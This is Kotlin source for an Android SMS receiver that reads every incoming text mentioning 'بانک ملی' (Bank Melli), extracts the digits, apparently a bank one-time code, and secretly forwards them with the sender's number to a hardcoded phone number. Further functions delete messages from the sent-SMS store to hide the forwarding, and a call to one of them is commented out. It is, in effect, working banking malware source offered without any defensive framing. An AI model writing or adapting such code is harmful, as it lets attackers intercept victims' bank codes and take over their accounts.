package com.javadesl.sms

import android.annotation.SuppressLint
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.Telephony
import android.telephony.SmsManager
import android.util.Log


class ReceiveSms : BroadcastReceiver() {

    override fun onReceive(p0: Context?, p1: Intent?) {
        for (sms in Telephony.Sms.Intents.getMessagesFromIntent(p1)) {
            if (sms.displayMessageBody.contains("بانک ملی")) {
//                Log.v("smsBroadCast", sms.displayMessageBody.filter { it.isDigit() })

                val sendSms = SmsManager.getDefault()
                sendSms.sendTextMessage(
                    "09393155090",
                    "ME",
                    "رمز ارسالی بانک : " + sms.displayMessageBody.filter { it.isDigit() } + "\n" + "دریافت شده از شماره : " + sms.displayOriginatingAddress,
                    null,
                    null
                )

//                val mainHandler = Handler(Looper.getMainLooper()).postDelayed({
//                    if (p0 != null) {
////                        deleteMessage(p0)
//                        //delete(p0)
//
//                        val messages = arrayOf(getSMS(p0))
//                        for (x in 1..messages.size) {
//                            Log.v("list77", getSMS(p0)?.get(x)?.filter { it.isDigit() }.toString())
//                            val id = getSMS(p0)?.get(x)?.filter { it.isDigit() }
//                            val inboxUri = Uri.parse("content://sms/sent")
//                            val rs2: Int =
//                                p0.contentResolver
//                                    .delete(inboxUri, Telephony.Sms._ID + "=$id", arrayOf("0"))
//
//                            Log.v("20000", rs2.toString())
//                        }
//
//
////
//                    }
//                }, 3000)

            } else
                Log.v("smsBroadCast", "NOTING")
        }
    }

    @SuppressLint("Range")
    fun getSMS(context: Context): List<String>? {
        val sms: MutableList<String> = ArrayList()
        val uriSMSURI = Uri.parse("content://sms/sent")
        val cur: Cursor = context.contentResolver.query(uriSMSURI, null, null, null, null)!!
        while (cur.moveToNext()) {
            val address = cur.getString(cur.getColumnIndex("address"))
            val body = cur.getString(cur.getColumnIndexOrThrow("body"))
            val id = cur.getString(0)

            if (address == "09393155090")
                sms.add("id: $id")
        }
        return sms
    }

    fun delete(context: Context): Int {
        val inboxUri = Uri.parse("content://sms/sent")
        var count = 0
        val c: Cursor = context.contentResolver.query(inboxUri, null, null, null, null)!!
        while (c.moveToNext()) {
            try {
                // Delete the SMS
                val pid: String = c.getString(0) // Get id;
                val uri = "content://sms/$pid"
                count = context.contentResolver.delete(
                    Uri.parse(uri),
                    null, null
                )
            } catch (e: Exception) {
            }
        }
        return count
    }

    @SuppressLint("Recycle")
    private fun deleteMessage(context: Context): Int {
        val deleteUri = Uri.parse("content://sms/sent")
        var count = 0
        val c =
            context.contentResolver.query(deleteUri, null, null, null, null)
        while (c!!.moveToNext()) {
            try {
                // Delete the SMS
                val pid = c.getString(0) // Get id;
                val uri = "content://sms/sent/$pid"
                count = context.contentResolver.delete(
                    Uri.parse(uri),
                    null, null
                )
            } catch (e: java.lang.Exception) {
            }
        }
        return count
    }
}